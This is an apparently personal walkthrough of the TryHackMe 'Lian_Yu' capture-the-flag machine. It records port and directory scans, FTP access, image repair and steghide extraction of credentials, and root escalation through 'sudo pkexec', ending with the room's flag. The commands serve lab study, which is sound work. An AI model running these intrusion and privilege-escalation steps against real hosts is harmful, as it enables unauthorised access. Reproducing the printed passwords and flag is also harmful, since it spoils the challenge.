nmap
```
root@kali:~# nmap -sV -sC -p- T5 $targetIP
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-23 01:36 UTC
Failed to resolve "T5".
Nmap scan report for ip-10-10-185-142.eu-west-1.compute.internal (10.10.185.142)
Host is up (0.00081s latency).
Not shown: 65530 closed ports
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.2
22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)
| ssh-hostkey:
|   1024 56:50:bd:11:ef:d4:ac:56:32:c3:ee:73:3e:de:87:f4 (DSA)
|   2048 39:6f:3a:9c:b6:2d:ad:0c:d8:6d:be:77:13:07:25:d6 (RSA)
|   256 a6:69:96:d7:6d:61:27:96:7e:bb:9f:83:60:1b:52:12 (ECDSA)
|_  256 3f:43:76:75:a8:5a:a6:cd:33:b0:66:42:04:91:fe:a0 (ED25519)
80/tcp    open  http    Apache httpd
|_http-server-header: Apache
|_http-title: Purgatory
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          34308/tcp   status
|   100024  1          35176/tcp6  status
|   100024  1          37250/udp   status
|_  100024  1          55455/udp6  status
34308/tcp open  status  1 (RPC #100024)
MAC Address: 02:77:E5:2C:8D:48 (Unknown)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.59 seconds
root@kali:~#

```

# gobuster
```
root@kali:~# gobuster dir -u http://$targetIP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,xml,html,aspx
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.185.142
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     xml,html,aspx,php,txt
[+] Timeout:        10s
===============================================================
2020/05/23 01:40:37 Starting gobuster
===============================================================
/index.html (Status: 200)
/island (Status: 301)
/server-status (Status: 403)
===============================================================
2020/05/23 01:45:12 Finished
===============================================================
root@kali:~#
```

## island

```
<!DOCTYPE html>
<html>
<body>
<style>
 
</style>
<h1> Ohhh Noo, Don't Talk............... </h1>





<p> I wasn't Expecting You at this Moment. I will meet you there </p><!-- go!go!go! -->






<p>You should find a way to <b> Lian_Yu</b> as we are planed. The Code Word is: </p><h2 style="color:white"> vigilante</style></h2>

</body>
</html>

```
***********.******

vigilante.ticket
# gobuster again
```
root@kali:~# gobuster dir -u http://$targetIP/island -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
-x php,txt,xml,html,aspx
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.185.142/island
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php,txt,xml,html,aspx
[+] Timeout:        10s
===============================================================
2020/05/23 02:05:29 Starting gobuster
===============================================================
/index.html (Status: 200)
/2100 (Status: 301)
```

# 2100

```
<!DOCTYPE html>
<html>
<body>

<h1 align=center>How Oliver Queen finds his way to Lian_Yu?</h1>


<p align=center >
<iframe width="640" height="480" src="https://www.youtube.com/embed/X8ZiFuW41yY">
</iframe> <p>
<!-- you can avail your .ticket here but how?   -->

</header>
</body>
</html>
```

## gobuster again
```
root@kali:~# gobuster dir -u http://$targetIP/island/2100 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x ticket
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.185.142/island/2100
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     ticket
[+] Timeout:        10s
===============================================================
2020/05/23 02:14:55 Starting gobuster
===============================================================
/green_arrow.ticket (Status: 200)
```

## green_arrow.ticket
```
This is just a token to get into Queen's Gambit(Ship)


RTy8yhBQdscX

```


```
RTy8yhBQdscX

base58
!#th3h00d

```

# ftp
```
root@kali:~# ftp 10.10.185.142
Connected to 10.10.185.142.
220 (vsFTPd 3.0.2)
Name (10.10.185.142:root):
530 Permission denied.
Login failed.
ftp> exit
221 Goodbye.
root@kali:~# ftp 10.10.185.142
Connected to 10.10.185.142.
220 (vsFTPd 3.0.2)
Name (10.10.185.142:root): vigilante
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0          511720 May 01 03:26 Leave_me_alone.png
-rw-r--r--    1 0        0          549924 May 05 11:10 Queen's_Gambit.png
-rw-r--r--    1 0        0          191026 May 01 03:25 aa.jpg
226 Directory send OK.
ftp> mget *
mget Leave_me_alone.png?
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for Leave_me_alone.png (511720 bytes).
226 Transfer complete.
511720 bytes received in 0.00 secs (98.6087 MB/s)
mget Queen's_Gambit.png?
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for Queen's_Gambit.png (549924 bytes).
226 Transfer complete.
549924 bytes received in 0.00 secs (107.7781 MB/s)
mget aa.jpg?
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for aa.jpg (191026 bytes).
226 Transfer complete.
191026 bytes received in 0.00 secs (71.5259 MB/s)
ftp>
```
## images

```
Leave_me_alone.png
corrupted

root@kali:~/getF# git clone https://github.com/sherlly/PCRT.git
Cloning into 'PCRT'...
remote: Enumerating objects: 23, done.
remote: Total 23 (delta 0), reused 0 (delta 0), pack-reused 23
Unpacking objects: 100% (23/23), done.
root@kali:~/getF# cd PCRT/
root@kali:~/getF/PCRT# ls
examples  LICENSE  PCRT.py  README.md
root@kali:~/getF/PCRT# python PCRT.py

         ____   ____ ____ _____
        |  _ \ / ___|  _ \_   _|
        | |_) | |   | |_) || |
        |  __/| |___|  _ < | |
        |_|    \____|_| \_\|_|

        PNG Check & Repair Tool

Project address: https://github.com/sherlly/PCRT
Author: sherlly
Version: 1.1

usage: PCRT.py [-h] [-q] [-y] [-v] [-m] [-n NAME] [-p PAYLOAD] [-w WAY]
               [-d DECOMPRESS] [-i INPUT] [-f] [-o OUTPUT]

optional arguments:
  -h, --help            show this help message and exit
  -q, --quiet           don't show the banner infomation
  -y, --yes             auto choose yes
  -v, --verbose         use the safe way to recover
  -m, --message         show the image information
  -n NAME, --name NAME  payload name [Default: random]
  -p PAYLOAD, --payload PAYLOAD
                        payload to hide
  -w WAY, --way WAY     payload chunk: [1]: ancillary [2]: critical
                        [Default:1]
  -d DECOMPRESS, --decompress DECOMPRESS
                        decompress zlib data file name
  -i INPUT, --input INPUT
                        Input file name (*.png) [Select from terminal]
  -f, --file            Input file name (*.png) [Select from window]
  -o OUTPUT, --output OUTPUT
                        Output repaired file name [Default: output.png]
root@kali:~/getF/PCRT# python PCRT.py ../Leave_me_alone.png
usage: PCRT.py [-h] [-q] [-y] [-v] [-m] [-n NAME] [-p PAYLOAD] [-w WAY]
               [-d DECOMPRESS] [-i INPUT] [-f] [-o OUTPUT]
PCRT.py: error: unrecognized arguments: ../Leave_me_alone.png
root@kali:~/getF/PCRT# python PCRT.py -i ../Leave_me_alone.png -o  result.png

         ____   ____ ____ _____
        |  _ \ / ___|  _ \_   _|
        | |_) | |   | |_) || |
        |  __/| |___|  _ < | |
        |_|    \____|_| \_\|_|

        PNG Check & Repair Tool

Project address: https://github.com/sherlly/PCRT
Author: sherlly
Version: 1.1

[Detected] Wrong PNG header!
File header: 58456FAE0A0D1A0A
Correct header: 89504E470D0A1A0A
[Notice] Auto fixing? (y or n) [default:y] y
[Finished] Now header:89504E470D0A1A0A
[Finished] Correct IHDR CRC (offset: 0x1D): 17A3715B
[Finished] IHDR chunk check complete (offset: 0x8)
[Finished] Correct IDAT chunk data length (offset: 0x21 length: 2000)
[Finished] Correct IDAT CRC (offset: 0x2029): DE876277
[Finished] Correct IDAT chunk data length (offset: 0x202D length: 2000)
[Finished] Correct IDAT CRC (offset: 0x4035): B50AEC90
[Finished] Correct IDAT chunk data length (offset: 0x4039 length: 2000)
[Finished] Correct IDAT CRC (offset: 0x6041): 74CF1865
[Finished] Correct IDAT chunk data length (offset: 0x6045 length: 2000)
[Finished] Correct IDAT CRC (offset: 0x804D): FA2B7B04
[Finished] Correct IDAT chunk data length (offset: 0x8051 length: 2000)
[Finished] Correct IDAT CRC (offset: 0xA059): FCC58727
[Finished] Correct IDAT chunk data length (offset: 0xA05D length: 2000)
[Finished] Correct IDAT CRC (offset: 0xC065): AAEEE079
[Finished] Correct IDAT chunk data length (offset: 0xC069 length: 2000)
[Finished] Correct IDAT CRC (offset: 0xE071): 84AF82F0
[Finished] Correct IDAT chunk data length (offset: 0xE075 length: 2000)
[Finished] Correct IDAT CRC (offset: 0x1007D): FD90AB4C
[Finished] Correct IDAT chunk data length (offset: 0x10081 length: 2000)
[Finished] Correct IDAT CRC (offset: 0x12089): E6A69A9F
[Finished] Correct IDAT chunk data length (offset: 0x1208D length: 2000)
[Finished] Correct IDAT CRC (offset: 0x14095): 1947C0C6
[Finished] Correct IDAT chunk data length (offset: 0x14099 length: 2000)
[Finished] Correct IDAT CRC (offset: 0x160A1): DBA9A9F7
[Finished] Correct IDAT chunk data length (offset: 0x160A5 length: 2000)
[Finished] Correct IDAT CRC (offset: 0x180AD): 2B03B819
[Finished] Correct IDAT chunk data length (offset: 0x180B1 length: 2000)
[Finished] Correct IDAT CRC (offset: 0x1A0B9): E55E3386
[Finished] Correct IDAT chunk data length (offset: 0x1A0BD length: 2000)
[Finished] Correct IDAT CRC (offset: 0x1C0C5): D63315CA
[Finished] Correct IDAT chunk data length (offset: 0x1C0C9 length: 2000)
[Finished] Correct IDAT CRC (offset: 0x1E0D1): EF943C9E
[Finished] Correct IDAT chunk data length (offset: 0x1E0D5 length: 2000)
[Finished] Correct IDAT CRC (offset: 0x200DD): 8224EF22
[Finished] Correct IDAT chunk data length (offset: 0x200E1 length: 2000)
[Finished] Correct IDAT CRC (offset: 0x220E9): 01D277D4
[Finished] Correct IDAT chunk data length (offset: 0x220ED length: 2000)
[Finished] Correct IDAT CRC (offset: 0x240F5): E05CBD39
[Finished] Correct IDAT chunk data length (offset: 0x240F9 length: 2000)
[Finished] Correct IDAT CRC (offset: 0x26101): 6615B80B
[Finished] Correct IDAT chunk data length (offset: 0x26105 length: 2000)
[Finished] Correct IDAT CRC (offset: 0x2810D): A406C7B9
[Finished] Correct IDAT chunk data length (offset: 0x28111 length: 2000)
[Finished] Correct IDAT CRC (offset: 0x2A119): 9233400C
[Finished] Correct IDAT chunk data length (offset: 0x2A11D length: 2000)
[Finished] Correct IDAT CRC (offset: 0x2C125): 36B89220
[Finished] Correct IDAT chunk data length (offset: 0x2C129 length: 2000)
[Finished] Correct IDAT CRC (offset: 0x2E131): 99483104
[Finished] Correct IDAT chunk data length (offset: 0x2E135 length: 2000)
[Finished] Correct IDAT CRC (offset: 0x3013D): C549FF2F
[Finished] Correct IDAT chunk data length (offset: 0x30141 length: 2000)
[Finished] Correct IDAT CRC (offset: 0x32149): F23BF103
[Finished] Correct IDAT chunk data length (offset: 0x3214D length: 2000)
[Finished] Correct IDAT CRC (offset: 0x34155): 1C90EB73
[Finished] Correct IDAT chunk data length (offset: 0x34159 length: 2000)
[Finished] Correct IDAT CRC (offset: 0x36161): 7E0EDE99
[Finished] Correct IDAT chunk data length (offset: 0x36165 length: 2000)
[Finished] Correct IDAT CRC (offset: 0x3816D): 4C0D0C12
[Finished] Correct IDAT chunk data length (offset: 0x38171 length: 2000)
[Finished] Correct IDAT CRC (offset: 0x3A179): 97ED1597
[Finished] Correct IDAT chunk data length (offset: 0x3A17D length: 2000)
[Finished] Correct IDAT CRC (offset: 0x3C185): E353EC26
[Finished] Correct IDAT chunk data length (offset: 0x3C189 length: 2000)
[Finished] Correct IDAT CRC (offset: 0x3E191): 742DCF6F
[Finished] Correct IDAT chunk data length (offset: 0x3E195 length: 2000)
[Finished] Correct IDAT CRC (offset: 0x4019D): 3B72BA4C
[Finished] Correct IDAT chunk data length (offset: 0x401A1 length: 2000)
[Finished] Correct IDAT CRC (offset: 0x421A9): 58F59443
[Finished] Correct IDAT chunk data length (offset: 0x421AD length: 2000)
[Finished] Correct IDAT CRC (offset: 0x441B5): 65C776EB
[Finished] Correct IDAT chunk data length (offset: 0x441B9 length: 2000)
[Finished] Correct IDAT CRC (offset: 0x461C1): EAAEB4CC
[Finished] Correct IDAT chunk data length (offset: 0x461C5 length: 2000)
[Finished] Correct IDAT CRC (offset: 0x481CD): DE4B0DCB
[Finished] Correct IDAT chunk data length (offset: 0x481D1 length: 2000)
[Finished] Correct IDAT CRC (offset: 0x4A1D9): 2E204FEE
[Finished] Correct IDAT chunk data length (offset: 0x4A1DD length: 2000)
[Finished] Correct IDAT CRC (offset: 0x4C1E5): 820D8390
[Finished] Correct IDAT chunk data length (offset: 0x4C1E9 length: 2000)
[Finished] Correct IDAT CRC (offset: 0x4E1F1): D0D0B71A
[Finished] Correct IDAT chunk data length (offset: 0x4E1F5 length: 2000)
[Finished] Correct IDAT CRC (offset: 0x501FD): 5D863B16
[Finished] Correct IDAT chunk data length (offset: 0x50201 length: 2000)
[Finished] Correct IDAT CRC (offset: 0x52209): B98E02BE
[Finished] Correct IDAT chunk data length (offset: 0x5220D length: 2000)
[Finished] Correct IDAT CRC (offset: 0x54215): B4368D59
[Finished] Correct IDAT chunk data length (offset: 0x54219 length: 2000)
[Finished] Correct IDAT CRC (offset: 0x56221): 3B296AEA
[Finished] Correct IDAT chunk data length (offset: 0x56225 length: 2000)
[Finished] Correct IDAT CRC (offset: 0x5822D): 23FED107
[Finished] Correct IDAT chunk data length (offset: 0x58231 length: 2000)
[Finished] Correct IDAT CRC (offset: 0x5A239): DFBCF69D
[Finished] Correct IDAT chunk data length (offset: 0x5A23D length: 2000)
[Finished] Correct IDAT CRC (offset: 0x5C245): AB1A092D
[Finished] Correct IDAT chunk data length (offset: 0x5C249 length: 2000)
[Finished] Correct IDAT CRC (offset: 0x5E251): 2EAAB00F
[Finished] Correct IDAT chunk data length (offset: 0x5E255 length: 2000)
[Finished] Correct IDAT CRC (offset: 0x6025D): F330B73F
[Finished] Correct IDAT chunk data length (offset: 0x60261 length: 2000)
[Finished] Correct IDAT CRC (offset: 0x62269): A6A0BB21
[Finished] Correct IDAT chunk data length (offset: 0x6226D length: 2000)
[Finished] Correct IDAT CRC (offset: 0x64275): 3961B160
[Finished] Correct IDAT chunk data length (offset: 0x64279 length: 2000)
[Finished] Correct IDAT CRC (offset: 0x66281): 2491E1EE
[Finished] Correct IDAT chunk data length (offset: 0x66285 length: 2000)
[Finished] Correct IDAT CRC (offset: 0x6828D): F7D1D74A
[Finished] Correct IDAT chunk data length (offset: 0x68291 length: 2000)
[Finished] Correct IDAT CRC (offset: 0x6A299): AE14F281
[Finished] Correct IDAT chunk data length (offset: 0x6A29D length: 2000)
[Finished] Correct IDAT CRC (offset: 0x6C2A5): B6D44F39
[Finished] Correct IDAT chunk data length (offset: 0x6C2A9 length: 2000)
[Finished] Correct IDAT CRC (offset: 0x6E2B1): EA2E32E2
[Finished] Correct IDAT chunk data length (offset: 0x6E2B5 length: 2000)
[Finished] Correct IDAT CRC (offset: 0x702BD): BE6634F4
[Finished] Correct IDAT chunk data length (offset: 0x702C1 length: 2000)
[Finished] Correct IDAT CRC (offset: 0x722C9): 32E6DF65
[Finished] Correct IDAT chunk data length (offset: 0x722CD length: 2000)
[Finished] Correct IDAT CRC (offset: 0x742D5): 52667133
[Finished] Correct IDAT chunk data length (offset: 0x742D9 length: 2000)
[Finished] Correct IDAT CRC (offset: 0x762E1): AEBB69F0
[Finished] Correct IDAT chunk data length (offset: 0x762E5 length: 2000)
[Finished] Correct IDAT CRC (offset: 0x782ED): 6C678EB8
[Finished] Correct IDAT chunk data length (offset: 0x782F1 length: 2000)
[Finished] Correct IDAT CRC (offset: 0x7A2F9): AD7E30F1
[Finished] Correct IDAT chunk data length (offset: 0x7A2FD length: 2000)
[Finished] Correct IDAT CRC (offset: 0x7C305): F3BA6E3E
[Detected] Error IDAT chunk data length! (offset: 0x7C309)
chunk length:BC7
actual length:BD3
[Notice] Try fixing it? (y or n) [default:y]
[Warning] Only fix because of DOS->Unix conversion
[Failed] Fixing failed, auto discard this operation...
[Finished] Correct IDAT chunk data length (offset: 0x7CEE8 length: BC7)
[Finished] Correct IDAT CRC (offset: 0x7DAB7): 807D465D
[Finished] IDAT chunk check complete (offset: 0x21)
[Finished] Correct IEND chunk
[Finished] IEND chunk check complete
[Finished] PNG check complete
[Notice] Show the repaired image? (y or n) [default:n]
root@kali:~/getF/PCRT#
root@kali:~/getF/PCRT#
root@kali:~/getF/PCRT# ls
examples  LICENSE  PCRT.py  README.md  result.png
root@kali:~/getF/PCRT#


the picture says 
Just Leave me alone
Here take it what you want
password


root@kali:~/getF# steghide extract -sf aa.jpg
Enter passphrase:
wrote extracted data to "ss.zip".
root@kali:~/getF# ls
 aa.jpg   Leave_me_alone.png   PCRT  "Queen's_Gambit.png"   ss.zip
root@kali:~/getF# unzip ss.zip
Archive:  ss.zip
  inflating: passwd.txt
  inflating: shado
root@kali:~/getF# ls
 aa.jpg   Leave_me_alone.png   passwd.txt   PCRT  "Queen's_Gambit.png"   shado   ss.zip
root@kali:~/getF# ls -al
total 1252
drwxr-xr-x  3 root root   4096 May 23 02:46  .
drwx------ 26 root root   4096 May 23 02:32  ..
-rw-r--r--  1 root root 191026 May 23 02:33  aa.jpg
-rw-r--r--  1 root root 511720 May 23 02:33  Leave_me_alone.png
-rw-r--r--  1 root root    333 Apr 28 06:06  passwd.txt
drwxr-xr-x  4 root root   4096 May 23 02:43  PCRT
-rw-r--r--  1 root root 549924 May 23 02:33 "Queen's_Gambit.png"
-rw-r--r--  1 root root     10 Apr 28 06:03  shado
-rw-r--r--  1 root root    596 May 23 02:46  ss.zip
root@kali:~/getF# cat passwd.txt
This is your visa to Land on Lian_Yu # Just for Fun ***


a small Note about it


Having spent years on the island, Oliver learned how to be resourceful and
set booby traps all over the island in the common event he ran into dangerous
people. The island is also home to many animals, including pheasants,
wild pigs and wolves.


M3tahuman


root@kali:~/getF# cat shado
M3tahuman
root@kali:~/getF#

ssh shado@$targetIP
ssh Oliver@$targetIP
ssh oliver@$targetIP
ssh LianYu@$targetIP




ssh yu@$targetIP
ssh queen@$targetIP
ssh jonas@$targetIP

could you give me a hint for the box [Lian_yu]
i got password for ssh, but I can't find the username...

```

# ftp again
```
ftp> ls -al
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 1001     1001         4096 May 05 11:10 .
drwxr-xr-x    4 0        0            4096 May 01 05:38 ..
-rw-------    1 1001     1001           44 May 01 07:13 .bash_history
-rw-r--r--    1 1001     1001          220 May 01 05:38 .bash_logout
-rw-r--r--    1 1001     1001         3515 May 01 05:38 .bashrc
-rw-r--r--    1 0        0            2483 May 01 07:07 .other_user
-rw-r--r--    1 1001     1001          675 May 01 05:38 .profile
-rw-r--r--    1 0        0          511720 May 01 03:26 Leave_me_alone.png
-rw-r--r--    1 0        0          549924 May 05 11:10 Queen's_Gambit.png
-rw-r--r--    1 0        0          191026 May 01 03:25 aa.jpg
226 Directory send OK.
ftp> get .bash_history
local: .bash_history remote: .bash_history
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for .bash_history (44 bytes).
226 Transfer complete.
44 bytes received in 0.00 secs (842.5245 kB/s)
ftp> get .other_user
local: .other_user remote: .other_user
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for .other_user (2483 bytes).
226 Transfer complete.
2483 bytes received in 0.00 secs (51.4777 MB/s)
ftp> exit
221 Goodbye.
root@kali:~/one# ls
root@kali:~/one# ls -al
total 16
drwxr-xr-x  2 root root 4096 May 23 03:43 .
drwx------ 27 root root 4096 May 23 03:42 ..
-rw-r--r--  1 root root   44 May 23 03:43 .bash_history
-rw-r--r--  1 root root 2483 May 23 03:43 .other_user
root@kali:~/one# cat .bash_history
Sorry I couldn't Help Other user Might help
root@kali:~/one# cat .other_user
Slade Wilson was 16 years old when he enlisted in the United States Army, having lied about his age. After serving a stint in Korea, he was later assigned to Camp Washington where he had been promoted to the rank of major. In the early 1960s, he met Captain Adeline Kane, who was tasked with training young soldiers in new fighting techniques in anticipation of brewing troubles taking place in Vietnam. Kane was amazed at how skilled Slade was and how quickly he adapted to modern conventions of warfare. She immediately fell in love with him and realized that he was without a doubt the most able-bodied combatant that she had ever encountered. She offered to privately train Slade in guerrilla warfare. In less than a year, Slade mastered every fighting form presented to him and was soon promoted to the rank of lieutenant colonel. Six months later, Adeline and he were married and she became pregnant with their first child. The war in Vietnam began to escalate and Slade was shipped overseas. In the war, his unit massacred a village, an event which sickened him. He was also rescued by SAS member Wintergreen, to whom he would later return the favor.

Chosen for a secret experiment, the Army imbued him with enhanced physical powers in an attempt to create metahuman super-soldiers for the U.S. military. Deathstroke became a mercenary soon after the experiment when he defied orders and rescued his friend Wintergreen, who had been sent on a suicide mission by a commanding officer with a grudge.[7] However, Slade kept this career secret from his family, even though his wife was an expert military combat instructor.

A criminal named the Jackal took his younger son Joseph Wilson hostage to force Slade to divulge the name of a client who had hired him as an assassin. Slade refused, claiming it was against his personal honor code. He attacked and killed the kidnappers at the rendezvous. Unfortunately, Joseph's throat was slashed by one of the criminals before Slade could prevent it, destroying Joseph's vocal cords and rendering him mute.

After taking Joseph to the hospital, Adeline was enraged at his endangerment of her son and tried to kill Slade by shooting him, but only managed to destroy his right eye. Afterwards, his confidence in his physical abilities was such that he made no secret of his impaired vision, marked by his mask which has a black, featureless half covering his lost right eye. Without his mask, Slade wears an eyepatch to cover his eye.

```

# priv
```
slade@LianYu:~$ ls
user.txt
slade@LianYu:~$ ls -al
total 32
drwx------ 2 slade slade 4096 May  1 06:55 .
drwxr-xr-x 4 root  root  4096 May  1 05:38 ..
-rw------- 1 slade slade   22 May  1 07:10 .bash_history
-rw-r--r-- 1 slade slade  220 May  1 00:23 .bash_logout
-rw-r--r-- 1 slade slade 3515 May  1 00:23 .bashrc
-r-------- 1 slade slade   77 May  1 05:42 .Important
-rw-r--r-- 1 slade slade  675 May  1 00:23 .profile
-r-------- 1 slade slade   63 May  1 07:14 user.txt
slade@LianYu:~$ cat .Important
What are you  Looking for ?

root Privileges ?

try to find Secret_Mission

slade@LianYu:~$ cat .bash_history
Sorry I couldn't Help
slade@LianYu:~$ find / -iname "*secret*" -type f 2>>/dev/null
/usr/share/man/man3/key_setsecret.3.gz
/usr/src/Secret_Mission
/proc/sys/net/ipv4/ipfrag_secret_interval
/proc/sys/net/ipv6/ip6frag_secret_interval
slade@LianYu:~$ cat /usr/src/Secret_Mission
Why do we need Mirakuru?


Enhancements to strength, senses, stamina and endurance in particular were raised beyond human capability, while reflexes and agility where raised only to the peak of human capability. Primarily, the serum resulted in the subject developing an accelerated healing factor that allowed them to recover completely from the most crippling, debilitating, and grievous of wounds, so long as any injuries were not immediately fatal or if an entire body part or organ were not lost; for example, the drug didn't keep Isabel Rochev from dying when her neck was snapped by Nyssa. Slade Wilson was also unable to regenerate his eye after it was pierced with an arrow, however this may be due to the arrow being left in his eye while the Mirakuru in his system became dormant.





super powers do you need just go find it.

slade@LianYu:~$
```

```
[+] Readable files inside /tmp, /var/tmp, /var/backups(limit 70)
-rwxr-xr-x 1 slade slade 222708 May 13 14:16 /tmp/linpeas.sh
-rwxr-xr-x 1 slade slade 46631 Jan  6 11:20 /tmp/LinEnum.sh
-rw-r--r-- 1 root root 250 May  1 00:25 /var/backups/dpkg.diversions.2.gz
-rw-r--r-- 1 root root 528407 May  1 06:55 /var/backups/dpkg.status.0
-rw-r--r-- 1 root root 20170 May  1 06:55 /var/backups/apt.extended_states.0
-rw-r--r-- 1 root root 724 May  1 00:25 /var/backups/dpkg.diversions.0
-rw-r--r-- 1 root root 61440 May  1 00:31 /var/backups/alternatives.tar.0
-rw-r--r-- 1 root root 161 Apr 25  2015 /var/backups/dpkg.statoverride.2.gz
-rw-r--r-- 1 root root 177 May  1 00:39 /var/backups/dpkg.statoverride.1.gz
-rw-r--r-- 1 root root 156306 May  1 06:55 /var/backups/dpkg.status.1.gz
-rw-r--r-- 1 root root 216 May  1 00:39 /var/backups/dpkg.statoverride.0
-rw-r--r-- 1 root root 146508 May  1 00:25 /var/backups/dpkg.status.2.gz
-rw-r--r-- 1 root root 250 May  1 00:25 /var/backups/dpkg.diversions.1.gz
-rw-r--r-- 1 root root 2240 May  1 00:25 /var/backups/apt.extended_states.1.gz

[+] Interesting writable files owned by me or writable by everyone (not in Home)
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files
/dev/mqueue
/dev/mqueue/linpeas.txt
/dev/shm
/home/slade
/run/lock
/run/user/1000
/run/user/1000/systemd
/tmp
/tmp/.font-unix
/tmp/.ICE-unix
/tmp/LinEnum.sh
/tmp/linpeas.sh
/tmp/.Test-unix
/tmp/.X11-unix
/tmp/.XIM-unix
/usr/src/Secret_Mission
/var/tmp


+] Modified interesting files in the last 5mins
/var/log/auth.log
/var/log/syslog
/var/mail/mail
/home/slade/.gnupg/pubring.gpg
/home/slade/.gnupg/trustdb.gpg
/home/slade/.gnupg/gpg.conf

[+] Unexpected folders in root
/live-build

[+] Files (scripts) in /etc/profile.d/
total 12
drwxr-xr-x  2 root root 4096 May  1 00:18 .
drwxr-xr-x 90 root root 4096 May 22 23:49 ..
-rw-r--r--  1 root root  663 Mar 22  2014 bash_completion.sh


slade@LianYu:~$ sudo -l
[sudo] password for slade:
Matching Defaults entries for slade on LianYu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User slade may run the following commands on LianYu:
    (root) PASSWD: /usr/bin/pkexec
slade@LianYu:~$ sudo /usr/bin/pkexec
pkexec --version |
       --help |
       --disable-internal-agent |
       [--user username] PROGRAM [ARGUMENTS...]

See the pkexec manual page for more details.
slade@LianYu:~$ sudo /usr/bin/pkexec ls
root.txt
slade@LianYu:~$ sudo /usr/bin/pkexec cat root.txt
                          Mission accomplished



You are injected me with Mirakuru:) ---> Now slade Will become DEATHSTROKE.



THM{MY_W0RD_I5_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_I'LL_BE_D34D}
                                                                              --DEATHSTROKE

Let me know your comments about this machine :)
I will be available @twitter @User6825

slade@LianYu:~$
```
